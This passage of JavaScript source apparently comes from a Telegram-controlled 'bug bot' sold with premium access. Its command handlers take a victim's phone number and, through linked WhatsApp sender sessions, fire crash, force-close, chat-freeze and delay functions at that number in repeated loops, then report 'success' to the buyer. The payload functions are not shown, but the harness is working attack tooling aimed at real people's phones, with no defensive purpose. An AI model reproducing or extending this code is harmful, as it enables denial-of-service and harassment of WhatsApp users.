⬡═—⊱「 𝗪𝗢𝗟𝗞𝗘𝗥 𝗖𝗥𝗔𝗦𝗛 BUG SYSTEM 」⊰—═⬡
▹ Target : ${formattedNumber}
▹ Type Bug : CrashInvis
▹ Status : Success
▹ Date : ${date}
\`\`\``, {
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [
          [{ text: "CHECK TARGET", url: `https://wa.me/${formattedNumber}` }]
        ]
      }
    });

    setTimeout(async () => {
      try {

        for (let i = 0; i < 100; i++) {
          await CrashFC(sock, target);
          await CrashFC(sock, target);
          await CrashFC(sock, target);
          await CrashFC(sock, target);
          await CrashFC(sock, target);
          await CrashFC(sock, target);
          await sleep(700)
        }

        console.log(`[SUCCESS] ForceInvinity ${formattedNumber}`)

      } catch (err) {
        console.log("Forceonemasage error:", err)
      }
    }, 100)

  } catch (err) {
    bot.sendMessage(msg.chat.id, `❌ Error: ${err.message}`)
    console.log("Forceonemasage ERROR:", err)
  }
});

//=======CASE BUG 4=========//
bot.onText(/\/CrashBeta (\d+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const targetNumber = match[1];
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const target = `${formattedNumber}@s.whatsapp.net`;
  const randomImage = getRandomImage();
  const userId = msg.from.id;
  const cooldown = checkCooldown(userId);

  if (cooldown > 0) {
    return bot.sendMessage(chatId, `Jeda dulu ya kakakk! ${cooldown} .`);
  }

  if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
      return bot.sendPhoto(chatId, randomImage, {
        caption: `<blockquote>❌ AKSES KHUSUS PREMIUM

User : ${username}
Status : Premium Required

Hubungi admin untuk membeli akses</blockquote>`,
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [
            [{ text: "CONTACT OWNER", url: "https://t.me/GabreilDitzforever" }]
          ]
        }
      })
    }


  try {
    if (sessions.size === 0) {
      return bot.sendMessage(
        chatId,
        "❌ Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /addsender 62xxx"
      );
    }

    if (cooldown > 0) {
      return bot.sendMessage(
        chatId,
        `Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`
      );
    }

    const sentMessage = await bot.sendPhoto(
      chatId,
      "https://imgbox.com/GGp1aJ4E",
      {
        caption: `\`\`\`
#𝗦𝗨𝗞𝗦𝗘𝗦 𝗞𝗜𝗥𝗜𝗠 𝗕𝗨𝗚 \`\`\`
◇ 𝐎𝐖𝐍𝐄𝐑 : @GabreilDitzforever
◇ 𝐏𝐄𝐍𝐆𝐈𝐑𝐈𝐌 𝐁𝐔𝐆 : @${msg.from.username}
◇ 𝐄𝐅𝐄𝐊 𝐁𝐔𝐆 : CRASH BETA
◇ 𝐊𝐎𝐑𝐁𝐀𝐍 : ${formattedNumber}
NOTE: JEDA 20 MENIT AGAR SENDER BUG TIDAK CEPET COPOT/OVERHEAT
`,
        parse_mode: "Markdown",
      }
    );

    let count = 0;

    console.log("\x1b[32m[PROCES MENGIRIM BUG]\x1b[0m TUNGGU HINGGA SELESAI");
    for (let i = 0; i < 70; i++) {
      await CrashBeta(sock, target);
      await CrashBeta(sock, target);
      await CrashBeta(sock, target);
      await CrashBeta(sock, target);
      await CrashBeta(sock, target);
      await sleep (200) 
      console.log(
        chalk.red(
          `[SANZOPE] BUG Processing ${count}/30 Loop ke ${formattedNumber}`
        )
      );
      count++;
    }
    console.log("\x1b[32m[SUCCESS]\x1b[0m Bug berhasil dikirim! 🚀");

    await bot.editMessageCaption(
      `
\`\`\`
#𝗦𝗨𝗞𝗦𝗘𝗦 𝗞𝗜𝗥𝗜𝗠 𝗕𝗨𝗚 \`\`\`
◇ 𝐎𝐖𝐍𝐄𝐑 : @GabreilDitzforever
◇ 𝐏𝐄𝐍𝐆𝐈𝐑𝐈𝐌 𝐁𝐔𝐆 : @${msg.from.username}
◇ 𝐄𝐅𝐄𝐊 𝐁𝐔𝐆 : Crash beta
◇ 𝐊𝐎𝐑𝐁𝐀𝐍 : ${formattedNumber}
NOTE: JEDA 20 MENIT AGAR SENDER BUG TIDAK CEPET COPOT/OVERHEAT
`,
      {
        chat_id: chatId,
        message_id: sentMessage.message_id,
        parse_mode: "Markdown",
        reply_markup: {
          inline_keyboard: [
            [{ text: "SUCCES BUG❗", url: `https://wa.me/${formattedNumber}` }],
          ],
        },
      }
    );
  } catch (error) {
    bot.sendMessage(chatId, `❌ Gagal mengirim bug: ${error.message}`);
  }
});

//=======CASE BUG 5========//
bot.onText(/\/Forceinvismasage (\d+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const targetNumber = match[1];
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const target = `${formattedNumber}@s.whatsapp.net`;
  const randomImage = getRandomImage();
  const userId = msg.from.id;
  const cooldown = checkCooldown(userId);

  if (cooldown > 0) {
    return bot.sendMessage(chatId, `Jeda dulu ya kakakk! ${cooldown} .`);
  }

  if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
      return bot.sendPhoto(chatId, randomImage, {
        caption: `<blockquote>❌ AKSES KHUSUS PREMIUM

User : ${username}
Status : Premium Required

Hubungi admin untuk membeli akses</blockquote>`,
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [
            [{ text: "CONTACT OWNER", url: "https://t.me/GabreilDitzforever" }]
          ]
        }
      })
    }


  try {
    if (sessions.size === 0) {
      return bot.sendMessage(
        chatId,
        "❌ Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /addsender 62xxx"
      );
    }

    if (cooldown > 0) {
      return bot.sendMessage(
        chatId,
        `Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`
      );
    }

    const sentMessage = await bot.sendPhoto(
      chatId,
      "https://imgbox.com/GGp1aJ4E",
      {
        caption: `\`\`\`
#𝗦𝗨𝗞𝗦𝗘𝗦 𝗞𝗜𝗥𝗜𝗠 𝗕𝗨𝗚 \`\`\`
◇ 𝐎𝐖𝐍𝐄𝐑 : @GabreilDitzforever
◇ 𝐏𝐄𝐍𝐆𝐈𝐑𝐈𝐌 𝐁𝐔𝐆 : @${msg.from.username}
◇ 𝐄𝐅𝐄𝐊 𝐁𝐔𝐆 : FORCE CLOSE INVISIBLE
◇ 𝐊𝐎𝐑𝐁𝐀𝐍 : ${formattedNumber}
NOTE: JEDA 20 MENIT AGAR SENDER BUG TIDAK CEPET COPOT/OVERHEAT
`,
        parse_mode: "Markdown",
      }
    );

    let count = 0;

    console.log("\x1b[32m[PROCES MENGIRIM BUG]\x1b[0m TUNGGU HINGGA SELESAI");
    for (let i = 0; i < 70; i++) {
      await invisfcmsg(sock, target);
      await invisfcmsg(sock, target);
      await invisfcmsg(sock, target);
      await invisfcmsg(sock, target);
      await invisfcmsg(sock, target);
      await sleep (200) 
      console.log(
        chalk.red(
          `[ULTRA] BUG Processing ${count}/70 Loop ke ${formattedNumber}`
        )
      );
      count++;
    }
    console.log("\x1b[32m[SUCCESS]\x1b[0m Bug berhasil dikirim! 🚀");

    await bot.editMessageCaption(
      `
\`\`\`
#𝗦𝗨𝗞𝗦𝗘𝗦 𝗞𝗜𝗥𝗜𝗠 𝗕𝗨𝗚 \`\`\`
◇ 𝐎𝐖𝐍𝐄𝐑 : @GabreilDitzforever
◇ 𝐏𝐄𝐍𝐆𝐈𝐑𝐈𝐌 𝐁𝐔𝐆 : @${msg.from.username}
◇ 𝐄𝐅𝐄𝐊 𝐁𝐔𝐆 : FORCE CLOSE INVISIBLE
◇ 𝐊𝐎𝐑𝐁𝐀𝐍 : ${formattedNumber}
NOTE: JEDA 20 MENIT AGAR SENDER BUG TIDAK CEPET COPOT/OVERHEAT
`,
      {
        chat_id: chatId,
        message_id: sentMessage.message_id,
        parse_mode: "Markdown",
        reply_markup: {
          inline_keyboard: [
            [{ text: "SUCCES BUG❗", url: `https://wa.me/${formattedNumber}` }],
          ],
        },
      }
    );
  } catch (error) {
    bot.sendMessage(chatId, `❌ Gagal mengirim bug: ${error.message}`);
  }
});

//======CASE BUG 6======\\
bot.onText(/\/Xmurbug(?:\s+(\d+))?/i, async (msg, match) => {
  try {
    const chatId = msg.chat.id
    const senderId = msg.from.id
    const username = msg.from.username ? `@${msg.from.username}` : msg.from.first_name || "User"

    const randomImage = getRandomImage()

    // cek premium
    if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
      return bot.sendPhoto(chatId, randomImage, {
        caption: `<blockquote>❌ AKSES KHUSUS PREMIUM

User : ${username}
Status : Premium Required

Hubungi admin untuk membeli akses</blockquote>`,
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [
            [{ text: "CONTACT OWNER", url: "https://t.me/GabreilRey" }]
          ]
        }
      });
    }

    if (!match || !match[1]) {
      return bot.sendMessage(chatId, "Format salah\nContoh: /Xmurbug 628xxxx")
    }

    const targetNumber = match[1]
    const formattedNumber = targetNumber.replace(/[^0-9]/g, "")
    const target = `${formattedNumber}@s.whatsapp.net`
    const date = getCurrentDate()

    const cooldown = checkCooldown(senderId)
    if (cooldown > 0) {
      return bot.sendMessage(chatId, `⏳ Tunggu ${cooldown} detik sebelum kirim lagi`)
    }

    if (sessions.size === 0) {
      return bot.sendMessage(chatId, "❌ Tidak ada sender WhatsApp yang aktif\nGunakan /addsender dulu")
    }

    await bot.sendMessage(chatId, `
\`\`\`JavaScript
⿻[ 𝐇 𝐀 𝐍 𝐓 𝐀 𝐗 𝐊 𝚰 𝐋 𝐋 𝐒 ⌟⿻ 

▹ Target : ${formattedNumber}
▹ Type Bug : Delay esay
▹ Status : Success
▹ Date : ${date}
\`\`\``, {
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [
          [{ text: "CHECK TARGET", url: `https://wa.me/${formattedNumber}`, style: "success" }]
        ]
      }
    });

    setTimeout(async () => {
      try {

        for (let i = 0; i < 10; i++) {
          await Delayin(sock, target);
          await Delayin(sock, target);
          await Delayin(sock, target);
          await Delayin(sock, target);
          await Delayin(sock, target);
          await Delayin(sock, target);
          await sleep(200)
        }

        console.log(`[SUCCESS] XqlNoClick ${formattedNumber}`)

      } catch (err) {
        console.log("XqlNoClick error:", err)
      }
    }, 100)

  } catch (err) {
    bot.sendMessage(msg.chat.id, `❌ Error: ${err.message}`)
    console.log("XqlNoClick ERROR:", err)
  }
});

//======CASE BUG 7======\\
bot.onText(/\/delayhard(?:\s+(\d+))?/i, async (msg, match) => {
  try {
    const chatId = msg.chat.id
    const senderId = msg.from.id
    const username = msg.from.username ? `@${msg.from.username}` : msg.from.first_name || "User"

    const randomImage = getRandomImage()

    // cek premium
    if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
      return bot.sendPhoto(chatId, randomImage, {
        caption: `<blockquote>❌ AKSES KHUSUS PREMIUM

User : ${username}
Status : Premium Required

Hubungi admin untuk membeli akses</blockquote>`,
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [
            [{ text: "CONTACT OWNER", url: "https://t.me/GabreilRey" }]
          ]
        }
      });
    }

    if (!match || !match[1]) {
      return bot.sendMessage(chatId, "Format salah\nContoh: /delayhard 628xxxx")
    }

    const targetNumber = match[1]
    const formattedNumber = targetNumber.replace(/[^0-9]/g, "")
    const target = `${formattedNumber}@s.whatsapp.net`
    const date = getCurrentDate()

    const cooldown = checkCooldown(senderId)
    if (cooldown > 0) {
      return bot.sendMessage(chatId, `⏳ Tunggu ${cooldown} detik sebelum kirim lagi`)
    }

    if (sessions.size === 0) {
      return bot.sendMessage(chatId, "❌ Tidak ada sender WhatsApp yang aktif\nGunakan /addsender dulu")
    }

    await bot.sendMessage(chatId, `
\`\`\`JavaScript
⿻[ 𝐇 𝐀 𝐍 𝐓 𝐀 𝐗 𝐊 𝚰 𝐋 𝐋 𝐒 ⌟⿻ 

▹ Target : ${formattedNumber}
▹ Type Bug : Delay Hard 
▹ Status : Success
▹ Date : ${date}
\`\`\``, {
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [
          [{ text: "CHECK TARGET", url: `https://wa.me/${formattedNumber}`, style: "success" }]
        ]
      }
    });

    setTimeout(async () => {
      try {

        for (let i = 0; i < 10; i++) {
          await epcihDiley(sock, target);
          await epcihDiley(sock, target);
          await epcihDiley(sock, target);
          await epcihDiley(sock, target);
          await epcihDiley(sock, target);
          await epcihDiley(sock, target);
          await sleep(300)
        }

        console.log(`[SUCCESS] Xentod ${formattedNumber}`)

      } catch (err) {
        console.log("Xentod error:", err)
      }
    }, 100)

  } catch (err) {
    bot.sendMessage(msg.chat.id, `❌ Error: ${err.message}`)
    console.log("Xentod ERROR:", err)
  }
});

//======CASE BUG 8======\\
bot.onText(/\/FrezeChat(?:\s+(\d+))?/i, async (msg, match) => {
  try {
    const chatId = msg.chat.id
    const senderId = msg.from.id
    const username = msg.from.username ? `@${msg.from.username}` : msg.from.first_name || "User"

    const randomImage = getRandomImage()

    // cek premium
    if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
      return bot.sendPhoto(chatId, randomImage, {
        caption: `<blockquote>❌ AKSES KHUSUS PREMIUM

User : ${username}
Status : Premium Required

Hubungi admin untuk membeli akses</blockquote>`,
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [
            [{ text: "CONTACT OWNER", url: "https://t.me/GabreilRey" }]
          ]
        }
      });
    }

    if (!match || !match[1]) {
      return bot.sendMessage(chatId, "Format salah\nContoh: /FrezeChat 628xxxx")
    }

    const targetNumber = match[1]
    const formattedNumber = targetNumber.replace(/[^0-9]/g, "")
    const target = `${formattedNumber}@s.whatsapp.net`
    const date = getCurrentDate()

    const cooldown = checkCooldown(senderId)
    if (cooldown > 0) {
      return bot.sendMessage(chatId, `⏳ Tunggu ${cooldown} detik sebelum kirim lagi`)
    }

    if (sessions.size === 0) {
      return bot.sendMessage(chatId, "❌ Tidak ada sender WhatsApp yang aktif\nGunakan /addsender dulu")
    }

    await bot.sendMessage(chatId, `
\`\`\`JavaScript
⿻[ 𝐇 𝐀 𝐍 𝐓 𝐀 𝐗 𝐊 𝚰 𝐋 𝐋 𝐒 ⌟⿻ 

▹ Target : ${formattedNumber}
▹ Type Bug : FREEZER CHAT
▹ Status : Success
▹ Date : ${date}
\`\`\``, {
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [
          [{ text: "CHECK TARGET", url: `https://wa.me/${formattedNumber}`, style: "success" }]
        ]
      }
    });

    setTimeout(async () => {
      try {

        for (let i = 0; i < 100; i++) {
          await FrezeChatAh(sock, target);
          await FrezeChatAh(sock, target);
          await FrezeChatAh(sock, target);
          await FrezeChatAh(sock, target);
          await FrezeChatAh(sock, target);
          await FrezeChatAh(sock, target);
          await sleep(2000)
        }

        console.log(`[SUCCESS] FreezeChat ${formattedNumber}`)

      } catch (err) {
        console.log("KillerAndro error:", err)
      }
    }, 100)

  } catch (err) {
    bot.sendMessage(msg.chat.id, `❌ Error: ${err.message}`)
    console.log("KillerAndro ERROR:", err)
  }
});

//======CASE BUG 9======\\
bot.onText(/\/delayspam(?:\s+(\d+))?/i, async (msg, match) => {
  try {
    const chatId = msg.chat.id
    const senderId = msg.from.id
    const username = msg.from.username ? `@${msg.from.username}` : msg.from.first_name || "User"

    const randomImage = getRandomImage()

    // cek premium
    if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
      return bot.sendPhoto(chatId, randomImage, {
        caption: `<blockquote>❌ AKSES KHUSUS PREMIUM

User : ${username}
Status : Premium Required

Hubungi admin untuk membeli akses</blockquote>`,
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [
            [{ text: "CONTACT OWNER", url: "https://t.me/GabreilRey" }]
          ]
        }
      });
    }

    if (!match || !match[1]) {
      return bot.sendMessage(chatId, "Format salah\nContoh: /delayspam 628xxxx")
    }

    const targetNumber = match[1]
    const formattedNumber = targetNumber.replace(/[^0-9]/g, "")
    const target = `${formattedNumber}@s.whatsapp.net`
    const date = getCurrentDate()

    const cooldown = checkCooldown(senderId)
    if (cooldown > 0) {
      return bot.sendMessage(chatId, `⏳ Tunggu ${cooldown} detik sebelum kirim lagi`)
    }

    if (sessions.size === 0) {
      return bot.sendMessage(chatId, "❌ Tidak ada sender WhatsApp yang aktif\nGunakan /addsender dulu")
    }

    await bot.sendMessage(chatId, `
\`\`\`JavaScript
⿻[ 𝐇 𝐀 𝐍 𝐓 𝐀 𝐗 𝐊 𝚰 𝐋 𝐋 𝐒 ⌟⿻ 

▹ Target : ${formattedNumber}
▹ Type Bug : Delay Spam
▹ Status : Success
▹ Date : ${date}
\`\`\``, {
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [
          [{ text: "CHECK TARGET", url: `https://wa.me/${formattedNumber}`,style: "success" }]
        ]
      }
    });

    setTimeout(async () => {
      try {

        for (let i = 0; i < 5; i++) {
          await galaxyMessage(sock, target);
          await galaxyMessage(sock, target);
          await galaxyMessage(sock, target);
          await galaxyMessage(sock, target);
          await galaxyMessage(sock, target);
          await galaxyMessage(sock, target);
          await sleep(200)
        }

        console.log(`[SUCCESS] FcDelete ${formattedNumber}`)

      } catch (err) {
        console.log("FcDelete error:", err)
      }
    }, 100)

  } catch (err) {
    bot.sendMessage(msg.chat.id, `❌ Error: ${err.message}`)
    console.log("FcDelete ERROR:", err)
  }
});

//======CASE BUG 10======\\
bot.onText(/\/invisible(?:\s+(\d+))?/i, async (msg, match) => {
  try {
    const chatId = msg.chat.id
    const senderId = msg.from.id
    const username = msg.from.username ? `@${msg.from.username}` : msg.from.first_name || "User"

    const randomImage = getRandomImage()

    // cek premium
    if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
      return bot.sendPhoto(chatId, randomImage, {
        caption: `<blockquote>❌ AKSES KHUSUS PREMIUM

User : ${username}
Status : Premium Required

Hubungi admin untuk membeli akses</blockquote>`,
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [
            [{ text: "CONTACT OWNER", url: "https://t.me/GabreilRey" }]
          ]
        }
      });
    }

    if (!match || !match[1]) {
      return bot.sendMessage(chatId, "Format salah\nContoh: /invisible 628xxxx")
    }

    const targetNumber = match[1]
    const formattedNumber = targetNumber.replace(/[^0-9]/g, "")
    const target = `${formattedNumber}@s.whatsapp.net`
    const date = getCurrentDate()

    const cooldown = checkCooldown(senderId)
    if (cooldown > 0) {
      return bot.sendMessage(chatId, `⏳ Tunggu ${cooldown} detik sebelum kirim lagi`)
    }

    if (sessions.size === 0) {
      return bot.sendMessage(chatId, "❌ Tidak ada sender WhatsApp yang aktif\nGunakan /addsender dulu")
    }

    await bot.sendMessage(chatId, `
\`\`\`JavaScript
⿻[ 𝐇 𝐀 𝐍 𝐓 𝐀 𝐗 𝐊 𝚰 𝐋 𝐋 𝐒 ⌟⿻ 

▹ Target : ${formattedNumber}
▹ Type Bug : Delay invisible
▹ Status : Success
▹ Date : ${date}
\`\`\``, {
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [
          [{ text: "CHECK TARGET", url: `https://wa.me/${formattedNumber}`, style: "success" }]
        ]
      }
    });

    setTimeout(async () => {
      try {

        for (let i = 0; i < 10; i++) {
          await noctradelayHardV6(target);
          await noctradelayHardV6(target);
          await noctradelayHardV6(target);
          await noctradelayHardV6(target);
          await noctradelayHardV6(target);
          await sleep(300)
        }

        console.log(`[SUCCESS] Xyper ${formattedNumber}`)

      } catch (err) {
        console.log("Xyper error:", err)
      }
    }, 100)

  } catch (err) {
    bot.sendMessage(msg.chat.id, `❌ Error: ${err.message}`)
    console.log("Xyper ERROR:", err)
  }
});

//======CASE BUG 11======\\
bot.onText(/\/OtaxBlank(?:\s+(\d+))?/i, async (msg, match) => {
  try {
    const chatId = msg.chat.id
    const senderId = msg.from.id
    const username = msg.from.username ? `@${msg.from.username}` : msg.from.first_name || "User"

    const randomImage = getRandomImage()

    // cek premium
    if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
      return bot.sendPhoto(chatId, randomImage, {
        caption: `<blockquote>❌ AKSES KHUSUS PREMIUM

User : ${username}
Status : Premium Required

Hubungi admin untuk membeli akses</blockquote>`,
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [
            [{ text: "CONTACT OWNER", url: "https://t.me/GabreilRey" }]
          ]
        }
      });
    }

    if (!match || !match[1]) {
      return bot.sendMessage(chatId, "Format salah\nContoh: /OtaxBlank 628xxxx")
    }

    const targetNumber = match[1]
    const formattedNumber = targetNumber.replace(/[^0-9]/g, "")
    const target = `${formattedNumber}@s.whatsapp.net`
    const date = getCurrentDate()

    const cooldown = checkCooldown(senderId)
    if (cooldown > 0) {
      return bot.sendMessage(chatId, `⏳ Tunggu ${cooldown} detik sebelum kirim lagi`)
    }

    if (sessions.size === 0) {
      return bot.sendMessage(chatId, "❌ Tidak ada sender WhatsApp yang aktif\nGunakan /addsender dulu")
    }

    await bot.sendMessage(chatId, `
\`\`\`JavaScript
⿻[ 𝐇 𝐀 𝐍 𝐓 𝐀 𝐗 𝐊 𝚰 𝐋 𝐋 𝐒 ⌟⿻ 

▹ Target : ${formattedNumber}
▹ Type Bug : Blank Otax V1
▹ Status : Success
▹ Date : ${date}
\`\`\``, {
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [
          [{ text: "CHECK TARGET", url: `https://wa.me/${formattedNumber}`, style: "success" }]
        ]
      }
    });

    setTimeout(async () => {
      try {

        for (let i = 0; i < 50; i++) {
          await otaxnewdocu(sock, target);
          await otaxnewdocu(sock, target);
          await otaxnewdocu(sock, target);
          await otaxnewdocu(sock, target);
          await otaxnewdocu(sock, target);
          await otaxnewdocu(sock, target);
          await sleep(500)
        }

        console.log(`[SUCCESS] ForceUix ${formattedNumber}`)

      } catch (err) {
        console.log("ForceUix error:", err)
      }
    }, 100)

  } catch (err) {
    bot.sendMessage(msg.chat.id, `❌ Error: ${err.message}`)
    console.log("ForceUix ERROR:", err)
  }
});

//======CASE BUG 12======\\
bot.onText(/\/OtaxBlankv2(?:\s+(\d+))?/i, async (msg, match) => {
  try {
    const chatId = msg.chat.id
    const senderId = msg.from.id
    const username = msg.from.username ? `@${msg.from.username}` : msg.from.first_name || "User"

    const randomImage = getRandomImage()

    // cek premium
    if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
      return bot.sendPhoto(chatId, randomImage, {
        caption: `<blockquote>❌ AKSES KHUSUS PREMIUM

User : ${username}
Status : Premium Required

Hubungi admin untuk membeli akses</blockquote>`,
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [
            [{ text: "CONTACT OWNER", url: "https://t.me/GabreilRey" }]
          ]
        }
      });
    }

    if (!match || !match[1]) {
      return bot.sendMessage(chatId, "Format salah\nContoh: /OtaxBlankv2 628xxxx")
    }

    const targetNumber = match[1]
    const formattedNumber = targetNumber.replace(/[^0-9]/g, "")
    const target = `${formattedNumber}@s.whatsapp.net`
    const date = getCurrentDate()

    const cooldown = checkCooldown(senderId)
    if (cooldown > 0) {
      return bot.sendMessage(chatId, `⏳ Tunggu ${cooldown} detik sebelum kirim lagi`)
    }

    if (sessions.size === 0) {
      return bot.sendMessage(chatId, "❌ Tidak ada sender WhatsApp yang aktif\nGunakan /addsender dulu")
    }

    await bot.sendMessage(chatId, `
\`\`\`JavaScript
⿻[ 𝐇 𝐀 𝐍 𝐓 𝐀 𝐗 𝐊 𝚰 𝐋 𝐋 𝐒 ⌟⿻ 

▹ Target : ${formattedNumber}
▹ Type Bug : Otax Blank Hard
▹ Status : Success
▹ Date : ${date}
\`\`\``, {
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [
          [{ text: "CHECK TARGET", url: `https://wa.me/${formattedNumber}`,
          style: "success" }]
        ]
      }
    });

    setTimeout(async () => {
      try {

        for (let i = 0; i < 100; i++) {
          await otaxnewdocu2(sock, target);
          await otaxnewdocu2(sock, target);
          await otaxnewdocu2(sock, target);
          await otaxnewdocu2(sock, target);
          await otaxnewdocu2(sock, target);
          await otaxnewdocu2(sock, target);
          await otaxnewdocu2(sock, target);
          await sleep(2000)
        }

        console.log(`[SUCCESS] delay invisible ${formattedNumber}`)

      } catch (err) {
        console.log("Xios error:", err)
      }
    }, 100)

  } catch (err) {
    bot.sendMessage(msg.chat.id, `❌ Error: ${err.message}`)
    console.log("Xios ERROR:", err)
  }
});

//======CASE BUG 12======\\
bot.onText(/\/FrezeSystem(?:\s+(\d+))?/i, async (msg, match) => {
  try {
    const chatId = msg.chat.id
    const senderId = msg.from.id
    const username = msg.from.username ? `@${msg.from.username}` : msg.from.first_name || "User"

    const randomImage = getRandomImage()

    // cek premium
    if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
      return bot.sendPhoto(chatId, randomImage, {
        caption: `<blockquote>❌ AKSES KHUSUS PREMIUM

User : ${username}
Status : Premium Required

Hubungi admin untuk membeli akses</blockquote>`,
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [
            [{ text: "CONTACT OWNER", url: "https://t.me/GabreilDitzforever" }]
          ]
        }
      });
    }

    if (!match || !match[1]) {
      return bot.sendMessage(chatId, "Format salah\nContoh: /DelayInvisible 628xxxx")
    }

    const targetNumber = match[1]
    const formattedNumber = targetNumber.replace(/[^0-9]/g, "")
    const target = `${formattedNumber}@s.whatsapp.net`
    const date = getCurrentDate()

    const cooldown = checkCooldown(senderId)
    if (cooldown > 0) {
      return bot.sendMessage(chatId, `⏳ Tunggu ${cooldown} detik sebelum kirim lagi`)
    }

    if (sessions.size === 0) {
      return bot.sendMessage(chatId, "❌ Tidak ada sender WhatsApp yang aktif\nGunakan /addsender dulu")
    }

    await bot.sendMessage(chatId, `
\`\`\`JavaScript
⬡═—⊱「 𝗛𝗔𝗡𝗧𝗔'𝗫 𝗞𝗜𝗟𝗟𝗦 𝗬𝗢𝗨 」⊰—═⬡
▹ Target : ${formattedNumber}
▹ Type Bug : Delay invisible
▹ Status : Success
▹ Date : ${date}
\`\`\``, {
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [
          [{ text: "CHECK TARGET", url: `https://wa.me/${formattedNumber}`, style: "success" }]
        ]
      }
    });

    setTimeout(async () => {
      try {

        for (let i = 0; i < 3; i++) {
          await NeoVocza(sock, target);
          await NeoVocza(sock, target);
          await NeoVocza(sock, target);
          await NeoVocza(sock, target);
          await NeoVocza(sock, target);
          await NeoVocza(sock, target);
          await sleep(200)
        }

        console.log(`[SUCCESS] delay invisible ${formattedNumber}`)

      } catch (err) {
        console.log("Delay Invisible error:", err)
      }
    }, 100)

  } catch (err) {
    bot.sendMessage(msg.chat.id, `❌ Error: ${err.message}`)
    console.log("Delay Invisible ERROR:", err)
  }
});

//======CASE BUG 13======\\
bot.onText(/\/mention(?:\s+(\d+))?/i, async (msg, match) => {
  try {
    const chatId = msg.chat.id
    const senderId = msg.from.id
    const username = msg.from.username ? `@${msg.from.username}` : msg.from.first_name || "User"

    const randomImage = getRandomImage()

    // cek premium
    if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
      return bot.sendPhoto(chatId, randomImage, {
        caption: `<blockquote>❌ AKSES KHUSUS PREMIUM

User : ${username}
Status : Premium Required

Hubungi admin untuk membeli akses</blockquote>`,
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [
            [{ text: "CONTACT OWNER", url: "https://t.me/GabreilRey" }]
          ]
        }
      });
    }

    if (!match || !match[1]) {
      return bot.sendMessage(chatId, "Format salah\nContoh: /mention 628xxxx")
    }

    const targetNumber = match[1]
    const formattedNumber = targetNumber.replace(/[^0-9]/g, "")
    const target = `${formattedNumber}@s.whatsapp.net`
    const date = getCurrentDate()

    const cooldown = checkCooldown(senderId)
    if (cooldown > 0) {
      return bot.sendMessage(chatId, `⏳ Tunggu ${cooldown} detik sebelum kirim lagi`)
    }

    if (sessions.size === 0) {
      return bot.sendMessage(chatId, "❌ Tidak ada sender WhatsApp yang aktif\nGunakan /addsender dulu")
    }

    await bot.sendMessage(chatId, `
\`\`\`JavaScript
⿻[ 𝐇 𝐀 𝐍 𝐓 𝐀 𝐗 𝐊 𝚰 𝐋 𝐋 𝐒 ⌟⿻ 

▹ Target : ${formattedNumber}
▹ Type Bug : Delay Hard
▹ Status : Success
▹ Date : ${date}
\`\`\``, {
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [
          [{ text: "CHECK TARGET", url: `https://wa.me/${formattedNumber}`, style: "success" }]
        ]
      }
    });

    setTimeout(async () => {
      try {

        for (let i = 0; i < 8; i++) {
          await OtaxAyunBelovedX(sock, target);
          await OtaxAyunBelovedX(sock, target);
          await OtaxAyunBelovedX(sock, target);
          await OtaxAyunBelovedX(sock, target);
          await OtaxAyunBelovedX(sock, target);
          await OtaxAyunBelovedX(sock, target);
          await sleep(300)
        }

        console.log(`[SUCCESS] delay invisible ${formattedNumber}`)

      } catch (err) {
        console.log("Delay Invisible error:", err)
      }
    }, 100)

  } catch (err) {
    bot.sendMessage(msg.chat.id, `❌ Error: ${err.message}`)
    console.log("Delay Invisible ERROR:", err)
  }
});

//=======CASE BUG GB=========//
function extractGroupID(link) {
  try {
    if (link.includes("chat.whatsapp.com/")) {
      return link.split("chat.whatsapp.com/")[1];
    }
    return null;
  } catch {
    return null;
  }
}

bot.onText(/\/blankgroup(?:\s(\d+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const randomImage = getRandomImage();
  const cooldown = checkCooldown(senderId);

  const args = msg.text.split(" ");
  const groupLink = args[1] ? args[1].trim() : null;

